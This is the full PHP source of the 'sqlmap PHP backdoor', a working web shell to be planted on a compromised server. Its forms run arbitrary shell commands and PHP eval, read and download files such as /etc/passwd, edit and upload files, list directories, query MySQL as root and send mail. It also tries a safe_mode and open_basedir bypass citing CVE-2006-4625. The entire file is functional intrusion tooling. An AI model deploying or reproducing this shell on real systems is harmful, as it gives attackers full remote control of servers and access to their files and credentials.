<?php
@set_time_limit();
@error_reporting(0);
@ob_implicit_flush();
$phpself=$_SERVER["PHP_SELF"];
$css="body { background: #FFCC66; font-family: sans-serif; margin: auto; margin-bottom: 1em; margin-top: 1em; width: 95%; } a { color: #663300; text-decoration: none; } input, textarea { border: 1px solid gray; } pre { border: 1px dashed #663300; padding: 5px; background: #fffff0; } table { border-collapse: collapse; border: 1px solid #663300; background: #fffff0; width: 100%; } td, th { border: 1px solid #663300; padding: .3em; } thead th, tfoot th { border: 1px solid #663300; text-align: center; font-size: 1em; font-weight: bold; color: #663300; background: #FFCC66; } #maintitle { background: #FFFFFF; border: 1px solid; border-color: #663300; padding: .3em; text-align: center; } #leftbody { background: #FFFFFF; border: 1px solid; border-color: #663300; padding: .5em; width: 22%; float: left; position: relative; } #rightbody { background: #FFFFFF; border: 1px solid; border-color: #663300; padding: 15px; width: 73%; float: right; position: relative; display:inline; }";
$cssEncoded=@urlencode($css);

function error($message) {
    $completeMessage="<b>Error</b>: " . $message . ".";
    die($completeMessage);
}

function getSymbolByQuantity($bytes) {
    $symbols=array('B', 'KiB', 'MiB', 'GiB', 'TiB', 'PiB', 'EiB', 'ZiB', 'YiB');
    $exp=@floor(log($bytes)/log(1024));

    return @sprintf('%.2f ' . $symbols[$exp], ($bytes/pow(1024, @floor($exp))));
}

function ex($command) {
    $res='';
    if (@function_exists('exec')) {
        @exec($command, $res);
        $res=@join("\n", $res);
    }
    elseif (@function_exists('shell_exec')) {
        $res=@shell_exec($command);
    }
    elseif(@function_exists('system')) {
        @ob_start();
        @system($command);
        $res=@ob_get_contents();
        @ob_end_clean();
    }
    elseif (@function_exists('passthru')) {
        @ob_start();
        @passthru($command);
        $res=@ob_get_contents();
        @ob_end_clean();
    }
    elseif (@is_resource($f=@popen($command, "r"))) {
        $res="";
        while(!@feof($f)) {
            $res .= @fread($f, 1024);
        }
        @pclose($f);
    }
    $res=@htmlspecialchars($res);
    return $res;
}

if (!isset($_REQUEST["download"]) and !isset($_REQUEST["phpinfo"])) {
    echo "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\" \"http://www.w3.org/TR/html4/strict.dtd\">";
    echo "<html><head>";
    echo "<meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\">";
    echo "<meta name=\"author\" content=\"Bernardo Damele A. G.\">";
    echo "<meta name=\"robots\" content=\"noindex,nofollow,noarchive\">";
    echo "<style type=\"text/css\">" . $css . "</style><title>sqlmap PHP backdoor</title></head>";
    echo "<body><div id=\"wrapper\" class=\"clearfix\"><div id=\"maintitle\"><h1>sqlmap PHP backdoor</h1></div><br><div id=\"leftbody\">";
    echo "<p><b>System information</b>: <a href=\"" . $phpself . "?sysinfo\">here</a><br>";
    echo "<b>PHP info</b>: <a href=\"" . $phpself . "?phpinfo\" target=\"_blank\">here</a><br>";
    echo "<b>Send an email</b>: <a href=\"" . $phpself . "?mailForm\">here</a></p>";
    echo "<form action=\"" . $phpself . "\" method=\"GET\"><b>Read a file</b><br><input type=\"text\" name=\"readFile\" value=\"/etc/passwd\"><input type=\"submit\" value=\"go\"></form><br>";
    echo "<form action=\"" . $phpself . "\" method=\"GET\"><b>Edit a file</b><br><input type=\"text\" name=\"editFile\"><input type=\"submit\" value=\"go\"></form><br>";
    echo "<form action=\"" . $phpself . "\" method=\"GET\"><b>Download a file</b><br>Directory: <input type=\"text\" name=\"dir\" value=\"/etc\"><br>File: <input type=\"text\" name=\"download\" value=\"passwd\"><input type=\"submit\" value=\"go\"></form><br>";
    echo "<form action=\"" . $phpself . "\" method=\"POST\" enctype=\"multipart/form-data\"><input type=hidden name=\"MAX_FILE_SIZE\" value=\"1000000000\"><b>Upload a file</b><br><input name=\"file\" type=\"file\"><br>to directory: <input type=\"text\" name=\"uploadDir\" value=\"/tmp\"><input type=\"submit\" name=\"upload\" value=\"upload\"></form><br>";
    echo "<form action=\"" . $phpself . "\" method=\"GET\"><b>Browse a directory</b><br><input type=\"text\" name=\"listDir\" value=\"/etc\"><input type=\"submit\" value=\"go\"></form><br>";
    echo "<form action=\"" . $phpself . "\" method=\"GET\"><b>Execute a shell command</b><br><input type=\"text\" name=\"cmd\" value=\"ps auxfww\"><input type=\"submit\" value=\"go\"></form><br>";
    echo "<form action=\"" . $phpself . "\" method=\"GET\"><b>Execute a PHP command</b><br><input type=\"text\" name=\"phpcode\" value=\"ini_get_all()\"><input type=\"submit\" value=\"go\"></form><br>";
    echo "<form action=\"" . $phpself . "\" method=\"GET\"><b>Execute a MySQL query</b><br>host: <input type=\"text\" name=\"host\" value=\"localhost\"><br>user: <input type=\"text\" name=\"user\" value=\"root\"><br>password: <input type=\"password\" name=\"password\"><br>query: <input type=\"text\" name=\"query\"><br><input type=\"submit\" value=\"execute\"></form><br>";
    echo "</div><div id=\"rightbody\">";
}

if (isset($_REQUEST["sysinfo"])) {
    if (@strtolower(@substr(@PHP_OS, 0, 3)) == "win") {
        $win=1;
    }
    else {
        $win=0;
    }
    $safeMode=@ini_get("safe_mode");
    $openBaseDir=@ini_get("open_basedir");
    if ($safeMode || $openBaseDir) {
	    /**
	    *	Exploit	CVE: CVE-2006-4625
	    *	Affected Software: PHP 5.1.6 / 4.4.4 < = x
	    *	Advisory URL: http://securityreason.com/achievement_securityalert/42
	    *	Try to restore to default value 
	    */
	    ini_restore("safe_mode");
	    ini_restore("open_basedir");
    }
    $magicQuotesGpc=@ini_get("magic_quotes_gpc");
    $dir=@getcwd();
    $total=@disk_total_space($dir);
    $free=@disk_free_space($dir);
    echo "<b>Operating system</b><br><pre>" . @PHP_OS;
    echo "</pre><b>Server uname</b><br><pre>" . php_uname();
    echo "</pre><b>Server uptime</b><br><pre>";
    echo ex("uptime");
    echo "</pre><b>Server time</b><br><pre>";
    echo date("D, M d, h:iA");
    echo "</pre><b>Disk space</b><br><pre>";
    echo "Total space: " . getSymbolByQuantity($total) . "<br>";
    echo "Free space: " . getSymbolByQuantity($free);
    echo "</pre><b>Web server username</b><br><pre>";
    echo (!$win) ? `id` . "<br>" : @get_current_user();
    echo "</pre><b>PHP version</b><br><pre>" . @phpversion();
    echo "</pre><b>PHP safe_mode</b><br><pre>";
    echo ($safeMode) ? "ON<br>" : "OFF<br>";
    echo "</pre><b>PHP open_basedir</b><br><pre>";
    echo ($openBaseDir) ? "ON<br>" : "OFF<br>";
    echo "</pre><b>PHP magic_quotes_gpc</b><br><pre>";
    echo ($magicQuotesGpc) ? "ON<br>" : "OFF<br>";
    echo "</pre><b>CPU information</b><br><pre>";
    echo ex("cat /proc/cpuinfo");
    echo "</pre><b>Memory information</b><br><pre>";
    echo ex("cat /proc/meminfo");
    echo "</pre><b>Open ports and active connections</b><br><pre>";
    echo ex("netstat -nat");
    echo "</pre><b>Network devices</b><br><pre>";
    echo ex("/sbin/ifconfig -a");
    echo "</pre><b>Processes</b><br><pre>";
    echo ex("ps auxfww");
    echo "</pre>";
}

else if(isset($_REQUEST["phpinfo"])) {
    echo @phpinfo();
}

else if (isset($_REQUEST["readFile"])) {
    $file=$_REQUEST["readFile"];
    $fileHandler=@fopen($file, "rb") or error("Unable to read file <code>" . $file . "</code>");
    $fileContent=@file_get_contents($file);
    echo "<p>File: <code>" . $file . "</code><p>";
    echo "<pre>" . @htmlspecialchars($fileContent) . "</pre>";
}

else if(isset($_REQUEST["editFile"])) {
    $file=$_REQUEST["editFile"];
    if (!$file) {
        error("Specify the file to edit");
    }
    $fileHandler=@fopen($file, "rb") or error("Unable to read file <code>" . $file . "</code>");
    $fileContent=@file_get_contents($file);
    echo "<form action=$phpself method=POST>";
    echo "File: <input type=text name=saveFile value=" . $file . " readonly=readonly><br><br>";
    echo "<textarea name=contentFile cols=80 rows=40>";
    echo $fileContent;
    echo "</textarea><br><input type=submit value=Save>";
}

else if (isset($_REQUEST["saveFile"])) {
    $file=$_REQUEST["saveFile"];
    $newContent=$_REQUEST["contentFile"];
    if (@is_writable($file)) {
        $fileHandler=@fopen($file, "w+") or error("Unable to read file <code>" . $file . "</code>");
        @fwrite($fileHandler, $newContent) or error("Unable to write on file <code>" . $file . "</code>");
        echo "File <code>" . $file . "</code> successfully written";
        @fclose($fileHandler);
    }
    else {
        error("File <code>" . $file . "</code> is not writable");
    }
}

else if (isset($_REQUEST["download"])) {
    ob_clean();
    $dir=$_REQUEST["dir"];
    $file=$_REQUEST["download"];
    $filename=$dir. "/" . $file;
    $fileHandler=@fopen($filename, "rb") or error("Unable to read file <code>" . $file . "</code>");
    $fileContent=@file_get_contents($filename);
    header("Content-type: application/octet-stream");
    header("Content-length: " . strlen($fileContent));
    header("Content-disposition: attachment; filename=" . $file . ";");
    echo $fileContent;
    exit;
}

else if (isset($_REQUEST["upload"])) {
    if (!isset($_REQUEST["uploadDir"])) {
        error("Specify directory name (ig: /tmp)");
    }
    $dir=$_REQUEST["uploadDir"];
    $file=$HTTP_POST_FILES["file"]["name"];
    @move_uploaded_file($HTTP_POST_FILES["file"]["tmp_name"], $dir . "/" . $file) or error("File upload error");
    @chmod($dir . "/" . $file, 0755) or error("Unable to set file permission on <code>" . $file . "</code>");
    echo "<p>File <code>" . $file . "</code> successfully uploaded to <code>" . $dir . "</code></p>";
}

else if (isset($_REQUEST["listDir"])) {
    $dirToOpen=$_REQUEST["listDir"];
    $dirHandler=@opendir($dirToOpen) or error("Unable to open directory");
    echo "<p>Directory: <code>" . $dirToOpen . "</code></p>";
    echo "<table border=1><tr><thead><th>Name</th><th>Permission</th><th>Owner/Group</th><th>Size</th><th>Read</th><th>Write</th><th>Download</th></thead></tr>";
    $list=array();
    while ($o=@readdir($dirHandler)) {
        $list[]=$o;
    }
    @closedir($dirHandler);
    @sort($list);
    foreach ($list as $file) {
        if ($file == ".") {
            continue;
        }
        $linkToFile=$dirToOpen . "/" . $file;
        $isdir=@is_dir($linkToFile);
        $islink=@is_link($linkToFile);
        $isfile=@is_file($linkToFile);
        echo "<tr><tbody>";
        if ($isdir) {
            echo "<td><a href=$phpself?listDir=$linkToFile>";
        }
        else if ($isfile) {
            echo "<td><a href=$phpself?readFile=$linkToFile>";
        }
        else {
            echo "<td>$linkToFile";
        }
        echo "$linkToFile</a></td>";
        echo "<td>" . @substr(@sprintf("%o", @fileperms($linkToFile)), -4) . "</td>";
        $owner=@posix_getpwuid(@fileowner($linkToFile));
        $group=@posix_getgrgid(@filegroup($linkToFile));
        echo "<td>" . $owner["name"] . "/" . $group["name"] . "</td>";
        if ($isdir) {
            echo "<td>DIR</td>";
        }
        else if ($islink) {
            echo "<td>LINK</td>";
        }
        else if ($isfile) {
            echo "<td>" . @sprintf("%u", @filesize($linkToFile)) . " bytes</td>";
        }
        else {
            echo "<td>Unknown</td>";
        }
        echo (@is_readable($linkToFile) && $isfile) ? "<td><a href=$phpself?readFile=$linkToFile>Read</a></td>" : "<td>-</td>";
        echo (@is_writable($linkToFile) && $isfile) ? "<td><a href=$phpself?editFile=$linkToFile>Write</a></td>" : "<td>-</td>";
        echo (@is_readable($linkToFile) && $isfile) ? "<td><a href=$phpself?dir=$dirToOpen&download=$file>Download</a></td>" : "<td>-</td>";
        echo "</tr>";
    }
}

else if (isset($_REQUEST["mailForm"])) {
    echo "<form action=" . $phpself . " method=POST>";
    echo "<input name=mail type=hidden><input type=hidden name=mail>";
    echo "To: <input name=to type=text  value=\"foo@bar.tld\"><br><br>";
    echo "Subject: <input name=subject type=text value=\"" . $_SERVER["HTTP_HOST"] . ": sqlmap PHP backdoor\"/><br><br>";
    echo "Body:<br><textarea cols=80 rows=40 name=msg></textarea><br>";
    echo "<input type=submit value=Send>";
}

else if (isset($_REQUEST["mail"])) {
    $status=@mail($_REQUEST["to"], $_REQUEST["subject"], $_REQUEST["msg"]);
    echo $status ? "Mail sent" : "Failed to send mail";
    @exit;
}

else if (isset($_REQUEST["cmd"])) {
    $cmd=$_REQUEST["cmd"];
    echo "<p>Shell command: <code>" . $cmd . "</code></p>";
    echo "<pre>" . ex($cmd) . "</pre>";
}

else if(isset($_REQUEST["phpcode"])) {
    $code=$_REQUEST["phpcode"];
    echo "<p>PHP command: <code>" . $code . "</code></p>";
    echo "<pre>";
    echo @eval("print_r($code);");
    echo "</pre>";
}

else if (isset($_REQUEST["query"])) {
    $host=$_REQUEST["host"];
    $user=$_REQUEST["user"];
    $password=$_REQUEST["password"];
    $query=$_REQUEST["query"];
    $link=@mysql_connect("$host", "$user", "$password");
    if (!$link) {
        error(@mysql_error());
    }
    $result=@mysql_query($query);
    if (!$result) {
        error(@mysql_error());
    }
    echo "<p>MySQL query: <code>" . $query . "</code></p>";
    echo "<pre>";
    while ($row=@mysql_fetch_array($result, MYSQL_ASSOC)) {
        @print_r($row);
    }
    echo "</pre>";
    @mysql_free_result($result);
}

if (!isset($_REQUEST["download"]) and !isset($_REQUEST["phpinfo"])) {
    echo "</div></div></body></html>";
}
?>
